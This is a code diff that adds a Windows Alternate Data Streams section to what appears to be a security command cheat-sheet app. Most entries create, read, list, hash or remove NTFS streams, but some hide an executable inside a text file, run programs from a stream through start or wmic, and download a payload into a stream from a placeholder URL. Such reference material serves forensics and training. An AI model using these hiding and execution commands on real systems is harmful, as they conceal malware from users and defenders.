@@ -251,6 +251,29 @@ const SECTIONS = [
     ]
   },
   {
+    id: 'windows',
+    emoji: '\u{1F4BB}',
+    title: 'Windows — Alternate Data Streams',
+    commands: [
+      { title: 'ADS — Create (cmd)', desc: 'Hide data in NTFS stream', diff: 'medium', code: 'echo <secret> > <file>:<stream>' },
+      { title: 'ADS — Create (PowerShell)', desc: 'Create stream with PowerShell', diff: 'medium', code: 'Set-Content <file> -Stream <stream> -Value "<secret>"' },
+      { title: 'ADS — Read (cmd)', desc: 'Display stream contents via more', diff: 'medium', code: 'more < <file>:<stream>' },
+      { title: 'ADS — Read (type)', desc: 'Display stream contents via type', diff: 'medium', code: 'type <file>:<stream>' },
+      { title: 'ADS — Read (PowerShell)', desc: 'Read stream with PowerShell', diff: 'medium', code: 'Get-Content <file> -Stream <stream>' },
+      { title: 'ADS — List (dir)', desc: 'Show all streams on files', diff: 'easy', code: 'dir /r' },
+      { title: 'ADS — List (PowerShell)', desc: 'Enumerate streams on file', diff: 'medium', code: 'Get-Item <file> -Stream *' },
+      { title: 'ADS — Recursive hunt', desc: 'Find all streams in directory tree', diff: 'hard', code: 'Get-ChildItem -Recurse | ForEach-Object { Get-Item $_.FullName -Stream * }' },
+      { title: 'ADS — Execute (start)', desc: 'Run executable from stream', diff: 'hard', code: 'start <file>:<stream>.exe' },
+      { title: 'ADS — Execute (wmic)', desc: 'Launch stream via WMIC', diff: 'hard', code: 'wmic process call create "C:\\<path>\\<file>:<stream>.exe"' },
+      { title: 'ADS — Download payload', desc: 'Store web download in ADS', diff: 'hard', code: 'Invoke-WebRequest -Uri <url> -OutFile <file>:<stream>.exe' },
+      { title: 'ADS — Store executable', desc: 'Hide EXE inside text file', diff: 'hard', code: 'type <payload>.exe > <file>.txt:<payload>.exe' },
+      { title: 'ADS — Hash stream', desc: 'Get hash of ADS content', diff: 'medium', code: 'Get-FileHash <file> -Stream <stream>' },
+      { title: 'ADS — Delete (PowerShell)', desc: 'Remove specific stream', diff: 'medium', code: 'Remove-Item <file> -Stream <stream>' },
+      { title: 'ADS — Scan (Sysinternals)', desc: 'Enumerate streams recursively', diff: 'medium', code: 'streams.exe -s <directory>' },
+      { title: 'ADS — Delete (Sysinternals)', desc: 'Remove streams from file', diff: 'medium', code: 'streams.exe -d <file>' },
+    ]
+  },
+  {
     id: 'crypto',
     emoji: '\u{1F510}',
     title: 'Cryptography & Encoding',
